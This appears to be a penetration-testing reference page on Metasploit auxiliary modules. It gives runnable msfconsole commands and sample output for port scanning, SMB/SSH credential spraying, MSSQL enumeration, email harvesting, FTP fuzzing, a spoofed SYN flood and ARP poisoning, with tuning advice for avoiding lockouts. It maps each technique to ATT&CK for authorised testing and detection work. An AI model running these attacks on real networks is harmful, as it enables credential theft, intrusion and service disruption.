# Metasploit — Auxiliary Modules — Hands-On Use Cases

The core of this file is one fully worked, source-verified example — `auxiliary/scanner/smb/smb_login` — walked through discovery, tuning, execution, and output interpretation. The remaining sections cover one real, verified module from each major `auxiliary/*` sub-category, so the coverage reflects the class's actual breadth rather than just its most common (`scanner/`) case.

## Contents
- [Discovering and Inspecting an Auxiliary Module](#discovering-and-inspecting-an-auxiliary-module)
- [Fleet-Wide TCP Port Discovery](#fleet-wide-tcp-port-discovery)
- [SMB Version and OS Fingerprinting Sweep](#smb-version-and-os-fingerprinting-sweep)
- [Full Worked Example — SMB Credential Validation at Scale](#full-worked-example--smb-credential-validation-at-scale)
- [SSH Credential Spraying Against a Range](#ssh-credential-spraying-against-a-range)
- [Authenticated Administrative Enumeration Once Credentials Are In Hand](#authenticated-administrative-enumeration-once-credentials-are-in-hand)
- [OSINT Email Harvesting With Zero Target-Network Footprint](#osint-email-harvesting-with-zero-target-network-footprint)
- [Multi-Action Modules — One Path, Several Behaviors](#multi-action-modules--one-path-several-behaviors)
- [Protocol Fuzzing for Crash-Class Bugs](#protocol-fuzzing-for-crash-class-bugs)
- [Deliberate Denial-of-Service Testing](#deliberate-denial-of-service-testing--high-risk-rarely-authorized)
- [ARP Spoofing for MITM Positioning](#arp-spoofing-for-mitm-positioning)
- [Automating a Fleet-Wide Sweep With a Resource Script](#automating-a-fleet-wide-sweep-with-a-resource-script)
- [Chaining a Scan Directly Into Exploitation](#chaining-a-scan-directly-into-exploitation)

---

## Discovering and Inspecting an Auxiliary Module

```
msf6 > search type:auxiliary smb_login
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > info
msf6 auxiliary(scanner/smb/smb_login) > show actions
```

`info` on this module prints its verified `References` block directly — this is one of the relatively rare modules that cites its own MITRE ATT&CK mapping in source (`CVE-1999-0506`, `T1021.002`, `T1110`), so the technique tags in this file for `smb_login` come straight from the module's own metadata, not an external inference. `show actions` returns empty — `smb_login` doesn't declare an `Actions` array (see the multi-action example further down for a module that does).

## Fleet-Wide TCP Port Discovery

**MITRE ATT&CK:** [T1046](https://attack.mitre.org/techniques/T1046/) (Network Service Discovery)

```
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.10.0/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 22,80,135,139,443,445,1433,3389,5985
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 50
msf6 auxiliary(scanner/portscan/tcp) > run

[*] 10.10.10.5:445 - TCP OPEN
[*] 10.10.10.5:3389 - TCP OPEN
[*] 10.10.10.12:22 - TCP OPEN
[*] 10.10.10.12:80 - TCP OPEN
[*] Scanned 26 of 254 hosts (10% complete)
...
```

`scanner/portscan/tcp` (authors `hdm`, `kris katterjohn`) performs a **full TCP connect** on each port — verified defaults: `PORTS` = `1-10000`, `TIMEOUT` = `1000` ms, `CONCURRENCY` = `10` (ports checked in parallel *per host*, separate from `THREADS` which controls *hosts* in parallel), `DELAY`/`JITTER` = `0`. Its own description states the operational reason to reach for it over a raw SYN scanner: **"This does not need administrative privileges on the source machine, which may be useful if pivoting"** — a full connect-scan module works from inside an established Meterpreter session/SOCKS pivot where raw-socket access isn't available, which a SYN-scan tool typically requires.

## SMB Version and OS Fingerprinting Sweep

**MITRE ATT&CK:** T1046 (Network Service Discovery)

```
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.10.10.0/24
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.10.10.5:445    - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:false) (encryption capabilities:false) (signatures:optional) (guid:{...}) (authentication domain:WORKGROUP) (native os:Windows 10 Enterprise) (build:19041)
```

`smb_version` negotiates the SMB dialect(s) a host supports and, when SMBv1 is present, extracts the native-OS string the way `04 - Target Evidence.md`'s SMBv1 discussion covers for `../Exploit Modules/`. No credentials are required — this is the standard first pass across a subnet before deciding which hosts are candidates for `smb_login` or a version-specific exploit like EternalBlue. **Signing-optional or signing-disabled hosts get flagged as a vulnerability note automatically** — the module reports a `vulns` record for exactly that condition, since it enables SMB relay attacks.

## Full Worked Example — SMB Credential Validation at Scale

**MITRE ATT&CK:** T1110 (Brute Force), [T1021.002](https://attack.mitre.org/techniques/T1021/002/) (Remote Services: SMB/Windows Admin Shares) — both cited directly in `smb_login`'s own `References` metadata

`auxiliary/scanner/smb/smb_login` tests one credential set (or a matrix of many) against a range of hosts and reports which ones authenticate — the same operational role as `../../NetExec/`'s SMB module or `../../Hydra/`'s SMB service, run from inside msfconsole with results landing directly in the workspace `creds`/`sessions` tables instead of a separate output file.

### Discover and configure

```
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > show options
```

Verified option surface (source: `modules/auxiliary/scanner/smb/smb_login.rb`) — credential fields are `SMBUser`/`SMBPass`/`SMBDomain` (not `USERNAME`/`PASSWORD` — the module explicitly deregisters those in favor of the SMB-specific names), plus the standard `AuthBrute` mixin's `USER_FILE`/`PASS_FILE`/`USERPASS_FILE` for list-based spraying:

| Option | Verified Default | Notes |
|---|---|---|
| `THREADS` | `1` | Raise for fleet-wide use — see tuning guidance below |
| `ABORT_ON_LOCKOUT` | `false` | If `true`, the **entire run stops** the moment one account lockout is detected — a real safety valve for domain-lockout-policy environments |
| `PRESERVE_DOMAINS` | `true` | Respects a domain prefix already present in a supplied username |
| `RECORD_GUEST` | `false` | Whether guest-level "random creds accepted" logins get written to the `creds` table |
| `DETECT_ANY_AUTH` | `false` | Pre-flight probe with a bogus random credential — if the target accepts it, the host is misconfigured to accept *any* credential and brute-forcing it is pointless (the module says so and stops for that host) |
| `DETECT_ANY_DOMAIN` | `false` | Same idea, for whether the domain field is actually being validated |
| `CreateSession` | `false` | New in Metasploit 6.4 — on a successful login, opens an **interactive SMB session** rather than just recording the credential |
| `STOP_ON_SUCCESS` | (from `AuthBrute`) | Stop testing further credentials against a host once one succeeds |
| `BRUTEFORCE_SPEED` | (from `AuthBrute`) | Coarse pacing dial (0–5) trading speed for stealth |

### Fleet-wide credential validation

```
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.10.0/24
msf6 auxiliary(scanner/smb/smb_login) > set SMBDomain CORP
msf6 auxiliary(scanner/smb/smb_login) > set USER_FILE /home/op/wordlists/users.txt
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /home/op/wordlists/spray_pw.txt
msf6 auxiliary(scanner/smb/smb_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/smb/smb_login) > set ABORT_ON_LOCKOUT true
msf6 auxiliary(scanner/smb/smb_login) > set THREADS 20
msf6 auxiliary(scanner/smb/smb_login) > run
```

**`THREADS`/`RHOSTS` tuning for fleet-wide use:**

- `THREADS` is *hosts in parallel*, not credentials in parallel — a `/24` with `THREADS 20` still tries every credential in `PASS_FILE` against each of the 20 in-flight hosts serially before that thread moves to the next host. Raising `THREADS` speeds up host coverage; it does **not** by itself reduce the number of auth attempts against any single host, which is the actual lockout-risk knob.
- Against a domain with an aggressive account-lockout policy, prefer a **low-and-wide** pattern: one or two passwords (a "password spray," not a full wordlist) across the *entire* `RHOSTS`/`USER_FILE` set, with `ABORT_ON_LOCKOUT true` as a hard stop. This is exactly the difference between "password spraying" (T1110.003) and "brute force" (T1110.001) in ATT&CK's own sub-technique split — `smb_login`'s options support either pattern, the operator's `PASS_FILE` size and `ABORT_ON_LOCKOUT` setting decide which one actually happens.
- `THREADS` above roughly 20–30 against a single subnet starts generating enough simultaneous SMB session-setup traffic to be its own anomaly independent of the auth-failure volume — see `05 - Detection and Hunting.md`.

### Output interpretation

Representative operator-facing output, built directly from `smb_login`'s own verified `print_status`/`print_good`/`print_brute` message templates in source (exact IP/port-prefix formatting can vary slightly by msfconsole version — the message text itself is verified):

```
[*] 10.10.10.5:445       - Starting SMB login bruteforce
[-] 10.10.10.5:445       - Failed: 'CORP\jsmith:Summer2026!'
[-] 10.10.10.5:445       - Failed: 'CORP\jsmith:Password1'
[*] 10.10.10.12:445      - Correct credentials, but unable to login: 'CORP\svc-backup:Summer2026!', Unable to authenticate: Access Denied
[+] 10.10.10.20:445      - Success: 'CORP\pgibson:Summer2026!' Admin
[*] Bruteforce completed, 1 credential was successful.
[*] You can open an SMB session with these credentials and CreateSession set to true
```

Reading this like an analyst would if this were a captured console log or a `~/.msf4/history` reconstruction:

- **`Failed`** — wrong credential, target reachable and responsive to auth attempts. This is the bulk of the noise a spray generates.
- **`Correct credentials, but unable to login` (`DENIED_ACCESS`)** — a genuinely important status distinct from a plain failure: the password is *right*, but the account is restricted from that specific logon type/host (a common domain-hardening posture — e.g. a service account denied interactive/network logon to workstations). Worth flagging back to the client even though it isn't a usable credential.
- **`Success: '...' Admin`** — the `access_level` (`Admin`/`User`/`Guest`) is the SMB share-permission tier the login mapped to, not a Windows privilege level claim — an `Admin`-level SMB login typically does mean local-administrator-equivalent access, which is what makes this specific credential immediately actionable for a follow-on `exploit/windows/smb/psexec` or Impacket `psexec.py` run (cross-link `../Metasploit PsExec (exploit-windows-smb-psexec)/` and `../../Impacket/psexec/`).
- Every successful login is written to the `creds` table automatically (`report_creds` in source), tagged with `private_type: ntlm_hash` or `:password` depending on what was actually supplied — see `../msfconsole/03 - Source Evidence.md` for the full database schema, not re-derived here.

## SSH Credential Spraying Against a Range

**MITRE ATT&CK:** T1110 (Brute Force)

```
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 10.10.20.0/24
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /home/op/wordlists/ssh_common.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 10
msf6 auxiliary(scanner/ssh/ssh_login) > run
```

Verified defaults: `RPORT` = `22`, `SSH_TIMEOUT` = `30` seconds (SSH negotiation, not the connection timeout). `ssh_login` also supports cleartext-private-key spraying instead of passwords via `KEY_PATH` (a directory of candidate keys — filenames starting with `.` or ending `.pub` are skipped automatically) and `KEY_PASS` for passphrase-protected keys, and a `GatherProof` option to run a harmless post-auth command as evidence the session actually works, not just that auth succeeded. This module defines **no `Actions`** — it's a single-behavior scanner, unlike the multi-action example below.

## Authenticated Administrative Enumeration Once Credentials Are In Hand

**MITRE ATT&CK:** [T1087.001](https://attack.mitre.org/techniques/T1087/001/) (Account Discovery: Local Account), [T1069](https://attack.mitre.org/techniques/T1069/) (Permission Groups Discovery)

```
msf6 > use auxiliary/admin/mssql/mssql_enum
msf6 auxiliary(admin/mssql/mssql_enum) > set RHOSTS 10.10.30.15
msf6 auxiliary(admin/mssql/mssql_enum) > set USERNAME sa
msf6 auxiliary(admin/mssql/mssql_enum) > set PASSWORD 'CorpDB2024!'
msf6 auxiliary(admin/mssql/mssql_enum) > run
```

`admin/mssql/mssql_enum` (Carlos Perez) is the `admin/*` category's defining shape: **it requires valid administrative credentials to run at all** — its own description says so directly, and the module either authenticates fresh with `USERNAME`/`PASSWORD` (verified defaults: `RPORT` `1433`, `USERNAME` `sa`, `PASSWORD` empty string) or, if a Meterpreter/MSSQL session is already active, reuses it via the `session` option instead of a fresh login. Once connected it systematically audits dangerous configuration state: `xp_cmdshell` enablement, C2 audit mode, OLE Automation Procedures, `sysadmin`-role membership (`select name from master.sys.syslogins where sysadmin = 1`), accounts where the username equals the password, and a hardcoded list of 150+ dangerous stored procedures exposed to `public`. This is the `admin/*` parallel to `exploit/*`'s "authenticated RCE as a post-credential-compromise pivot step" use case (`../Exploit Modules/01 - Overview.md`) — the operator already has a foothold (valid DB creds, likely from `smb_login`/`ssh_login` above or a config file found elsewhere), and this module converts that foothold into a structured picture of exactly how over-privileged the account is.

## OSINT Email Harvesting With Zero Target-Network Footprint

**MITRE ATT&CK:** [T1593.002](https://attack.mitre.org/techniques/T1593/002/) (Search Open Websites/Domains: Search Engines) for the collection method, plus [T1589.002](https://attack.mitre.org/techniques/T1589/002/) (Gather Victim Identity Information: Email Addresses) for the objective

```
msf6 > use auxiliary/gather/search_email_collector
msf6 auxiliary(gather/search_email_collector) > set DOMAIN targetcorp.com
msf6 auxiliary(gather/search_email_collector) > set OUTFILE /home/op/loot/targetcorp_emails.txt
msf6 auxiliary(gather/search_email_collector) > run

[*] Searching Google for email addresses from targetcorp.com
[*] Extracted 14 email addresses from Google
...
[*] Located 22 email addresses for targetcorp.com
```

`search_email_collector` (Carlos Perez) queries Google, Bing, and Yahoo (each independently toggleable via `SEARCH_GOOGLE`/`SEARCH_BING`/`SEARCH_YAHOO`, all `true` by default) for pages mentioning `@targetcorp.com`-pattern addresses. **This is the important negative-evidence case for the whole `gather/*` category**: every packet this module sends goes to a public search engine, never to the target organization's own infrastructure — a target-side SOC has *zero* opportunity to observe this activity, no matter how good their logging is. That reframes what "detection" even means for this specific module — see the framing note in `04 - Target Evidence.md`.

## Multi-Action Modules — One Path, Several Behaviors

**MITRE ATT&CK:** T1087.002 (Account Discovery: Domain Account) or T1018 (Remote System Discovery), depending on which built-in query is selected — tag per actual query run, not once for the whole module

```
msf6 > use auxiliary/gather/ldap_query
msf6 auxiliary(gather/ldap_query) > show actions
msf6 auxiliary(gather/ldap_query) > set ACTION ENUM_DOMAIN_USERS
msf6 auxiliary(gather/ldap_query) > set RHOSTS 10.10.40.10
msf6 auxiliary(gather/ldap_query) > set USERNAME CORP\\ldapuser
msf6 auxiliary(gather/ldap_query) > set PASSWORD 'ReadOnlyPass!'
msf6 auxiliary(gather/ldap_query) > run
```

This is the concrete illustration of the `ActionList`/`Action` mechanism from `01 - Overview.md`: `ldap_query` ships a library of predefined LDAP queries (domain users, computers, groups, trusts, etc.), each surfaced as its own named `ACTION`, plus two reserved actions — `RUN_SINGLE_QUERY` (ad hoc filter/attributes the operator supplies directly) and `RUN_QUERY_FILE` (a batch of queries from a JSON/YAML file). One module path, dozens of distinct enumeration behaviors, selected entirely through `ACTION` rather than dozens of near-duplicate module files.

## Protocol Fuzzing for Crash-Class Bugs

**MITRE ATT&CK:** No dedicated ATT&CK technique exists for fuzzing specifically; the closest formal mapping is T1595.002 (Active Scanning: Vulnerability Scanning), used loosely here — fuzzing is pre-authorization vulnerability-discovery activity, not a named adversary technique in the framework

```
msf6 > use auxiliary/fuzzers/ftp/ftp_pre_post
msf6 auxiliary(fuzzers/ftp/ftp_pre_post) > set RHOSTS 10.10.50.5
msf6 auxiliary(fuzzers/ftp/ftp_pre_post) > set USER anonymous
msf6 auxiliary(fuzzers/ftp/ftp_pre_post) > set STARTSIZE 10
msf6 auxiliary(fuzzers/ftp/ftp_pre_post) > set ENDSIZE 20000
msf6 auxiliary(fuzzers/ftp/ftp_pre_post) > set STOPAFTER 2
msf6 auxiliary(fuzzers/ftp/ftp_pre_post) > run
```

`fuzzers/ftp/ftp_pre_post` (corelanc0d3r, jduck) connects to an FTP service and sends progressively larger fuzz strings (`STARTSIZE` → `ENDSIZE`, stepping by `STEPSIZE`, default `10`/`20000`/`10` respectively) against a fixed command list (`USER`, `RETR`, `STOR`, `SITE`, `MKD`, and ~40 others verified in source) both pre- and post-authentication, plus an evil-character-payload list (format strings, path traversal sequences, null bytes) rather than pure random data. `STOPAFTER` (default `2`) halts after that many consecutive connection errors — the module's own signal that it likely just crashed the service. Verified `Notes` metadata: `Stability: CRASH_SERVICE_DOWN` — this module's entire purpose is finding the input that makes that happen, which is exactly why it belongs in a lab/pre-authorization context rather than a production FTP server during a live engagement window.

## Deliberate Denial-of-Service Testing — High-Risk, Rarely Authorized

> 🔴 **Scope this explicitly before running anything in `dos/*`.** Unlike an `Average`-ranked exploit where a crash is an accepted *possibility*, a `dos/*` module's entire purpose is degrading or crashing the target — treat it as out of scope by default unless the engagement's rules of engagement name it specifically.

**MITRE ATT&CK:** [T1499.002](https://attack.mitre.org/techniques/T1499/002/) (Endpoint Denial of Service: Service Exhaustion Flood) for a single-service flood like the worked example below; [T1498.001](https://attack.mitre.org/techniques/T1498/001/) (Network Denial of Service: Direct Network Flood) is the better fit for a volumetric flood aimed at overwhelming a link/segment rather than one service

```
msf6 > use auxiliary/dos/tcp/synflood
msf6 auxiliary(dos/tcp/synflood) > set RHOST 10.10.60.5
msf6 auxiliary(dos/tcp/synflood) > set RPORT 443
msf6 auxiliary(dos/tcp/synflood) > set NUM 5000
msf6 auxiliary(dos/tcp/synflood) > run -j
```

`dos/tcp/synflood` (kris katterjohn) crafts raw TCP SYN packets via PacketFu — verified options: `RPORT` default `80`, `SHOST`/`SPORT` optional and **randomized if left unset** (source-address spoofing is the default behavior, not an opt-in flag), `NUM` optional and **unbounded if unset** — an unconfigured `NUM` means the flood runs until manually killed (`jobs -k <id>`). Each packet randomizes `ip_ttl` (128–255) and `tcp_win` (1–4096) in addition to the spoofed source, which is why this module requires raw-socket privileges on the operator host — it is not going through the normal TCP stack at all. `run -j` is the standard pattern here since a flood is a long-running, non-interactive job.

## ARP Spoofing for MITM Positioning

**MITRE ATT&CK:** [T1557.002](https://attack.mitre.org/techniques/T1557/002/) (Adversary-in-the-Middle: ARP Cache Poisoning)

```
msf6 > use auxiliary/spoof/arp/arp_poisoning
msf6 auxiliary(spoof/arp/arp_poisoning) > set SHOST 10.10.70.100
msf6 auxiliary(spoof/arp/arp_poisoning) > set SMAC 00:11:22:33:44:55
msf6 auxiliary(spoof/arp/arp_poisoning) > set DHOST 10.10.70.1
msf6 auxiliary(spoof/arp/arp_poisoning) > run -j
```

`spoof/arp/arp_poisoning` sends forged ARP replies to poison a target's ARP cache — its own description states the dual use directly: **"conduct IP address spoofing or a denial of service."** Verified `Notes` metadata: `Stability: OS_RESOURCE_LOSS`, `SideEffects: IOC_IN_LOGS` — the Framework's own risk classification for this module explicitly acknowledges it leaves indicators behind. This is the same technique class as `../../Responder/` (LLMNR/NBT-NS poisoning) but at Layer 2 against ARP specifically — cross-link that folder for the sibling technique already covered in depth in this repo.

## Automating a Fleet-Wide Sweep With a Resource Script

```
# smb_login_sweep.rc
use auxiliary/scanner/smb/smb_login
set SMBDomain CORP
setg RHOSTS file:in_scope_hosts.txt
set USER_FILE /home/op/wordlists/users.txt
set PASS_FILE /home/op/wordlists/spray_pw.txt
set ABORT_ON_LOCKOUT true
set THREADS 20
run
```

```
msfconsole -r smb_login_sweep.rc
```

Same resource-script mechanic covered for exploit modules in `../Exploit Modules/02 - Hands-On Use Cases.md` — see `../msfconsole/01 - Overview.md` for the full pattern, not re-derived here.

## Chaining a Scan Directly Into Exploitation

Once an auxiliary scanner returns a positive result — a vulnerable version from `smb_version`, a working credential from `smb_login`, an open admin port from `portscan/tcp` — the natural next step is loading the matching `exploit/*` module and setting `RHOSTS` to the subset of hosts that actually qualified. The full worked version of this handoff (`auxiliary/scanner/smb/smb_ms17_010` → `exploit/windows/smb/ms17_010_eternalblue`) already lives in `../Exploit Modules/02 - Hands-On Use Cases.md` — this page doesn't duplicate it, only points to it as the canonical example of auxiliary-to-exploit chaining.
